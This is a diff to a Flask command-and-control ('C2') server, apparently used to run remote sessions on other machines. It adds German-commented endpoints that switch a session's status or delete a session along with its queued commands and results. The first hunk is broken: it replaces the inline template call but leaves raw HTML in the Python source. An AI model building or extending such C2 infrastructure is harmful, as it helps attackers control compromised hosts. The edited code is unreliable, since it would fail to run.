@@ -179,10 +179,12 @@ def get_pending_commands(hostname):
 # WEB DASHBOARD - Railway Optimized
 # =============================================================================
 
+from flask import render_template
+
 @app.route('/')
 def dashboard():
-    """Main C2 dashboard - works on any device"""
-    return render_template_string('''
+    return render_template('dashboard.html')
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -880,6 +882,67 @@ def api_get_result(session, command):
     
     except Exception as e:
         return jsonify({'error': str(e)}), 500
+
+# =============================================================================
+# Session Switch
+# =============================================================================
+
+@app.route('/api/toggle-status', methods=['POST'])
+def toggle_status():
+    try:
+        data = request.get_json()
+        if data.get('api_key') != API_KEY:
+            return jsonify({'error': 'Unauthorized'}), 401
+
+        hostname = data.get('hostname', '').strip()
+        if not hostname:
+            return jsonify({'error': 'Hostname required'}), 400
+
+        with db_lock:
+            with sqlite3.connect(DATABASE_FILE) as conn:
+                # Hole aktuellen Status
+                cursor = conn.execute('SELECT status FROM sessions WHERE hostname = ?', (hostname,))
+                row = cursor.fetchone()
+                if not row:
+                    return jsonify({'error': 'Session not found'}), 404
+
+                current_status = row[0]
+                new_status = 'inactive' if current_status == 'active' else 'active'
+
+                # Aktualisieren
+                conn.execute('UPDATE sessions SET status = ? WHERE hostname = ?', (new_status, hostname))
+
+        return jsonify({'message': f'Status für {hostname} geändert zu {new_status}'}), 200
+
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+# =============================================================================
+# Session Löschen
+# =============================================================================
+
+@app.route('/api/delete-session', methods=['POST'])
+def delete_session():
+    try:
+        data = request.get_json()
+        if data.get('api_key') != API_KEY:
+            return jsonify({'error': 'Unauthorized'}), 401
+
+        hostname = data.get('hostname', '').strip()
+        if not hostname:
+            return jsonify({'error': 'Hostname required'}), 400
+
+        with db_lock:
+            with sqlite3.connect(DATABASE_FILE) as conn:
+                conn.execute('DELETE FROM sessions WHERE hostname = ?', (hostname,))
+                conn.execute('DELETE FROM commands WHERE session_hostname = ?', (hostname,))
+                conn.execute('DELETE FROM command_results WHERE session_hostname = ?', (hostname,))
+
+        return jsonify({'message': f'Session {hostname} gelöscht'}), 200
+
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
 
 # =============================================================================
 # DEPLOYMENT HELPER
